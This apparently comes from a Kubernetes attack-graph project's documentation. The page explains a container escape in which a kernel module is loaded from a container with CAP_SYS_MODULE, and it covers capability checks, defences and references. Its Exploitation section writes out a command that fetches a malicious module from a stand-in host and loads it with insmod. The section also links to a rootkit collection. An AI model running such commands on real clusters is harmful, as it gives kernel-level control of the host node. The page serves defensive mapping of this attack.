# CE_MODULE_LOAD

Load a kernel module from within an overprivileged container to breakout into the node.

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Container](../vertices/CONTAINER.md) | [Node](../vertices/NODE.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |

## Details

Container isolation mechanisms are restricted to user-space execution. If an attacker gains kernel level execution via loading a kernel module or exploiting a kernel vulnerability, all isolation mechanisms can be bypassed. If a container is run with `--privileged` or if `CAP_SYS_MODULE` is explicitly enabled via the `securityContext` setting, kernel modules can be loaded from within the container, leading to a trivial and powerful container escape.

## Prerequisites

Execution within a container process with the `CAP_SYS_MODULE` capability enabled.

See the [example pod spec](../../test/setup/test-cluster/attacks/CE_SYS_MODULE.yaml).

## Checks

From within a running container, determine whether it is running with `CAP_SYS_MODULE`:

```bash
# Check the current process' capabilities
cat /proc/self/status | grep CapEff
# CapEff:	00000000a80425fb

# Decode the capabilities (on current box or offline) and check for CAP_SYS_MODULE
# NOTE: can install capsh via apt-get update && apt-get install libcap2-bin
capsh --decode=00000000a80425fb | grep cap_sys_module
```

## Exploitation

Download a pre-compiled kernel module suitable for the target OS/architecture (see [examples](https://github.com/milabs/awesome-linux-rootkits)) and load from within the container:

```bash
curl -O exploit.delivery/bad.ko
insmod bad.ko
```

## Defences

### Monitoring

+ Monitor for unfamiliar kernel modules loaded or kernel modules loaded from within a running pod which should both be high-fidelity signals of malicious activity.

### Implement security policies

Use a pod security policy or admission controller to prevent or limit the creation of pods with additional powerful capabilities.

### Least Privilege

Avoid running containers as the root user. Specify an unprivileged user account using the `securityContext`.

## Calculation

[EscapeModuleLoad](../../pkg/kubehound/graph/edge/escape_module_load.go)

## References:

+ [Compendium Of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)
+ [Linux Privilege Escalation - Exploiting Capabilities - StefLan's Security Blog](https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/)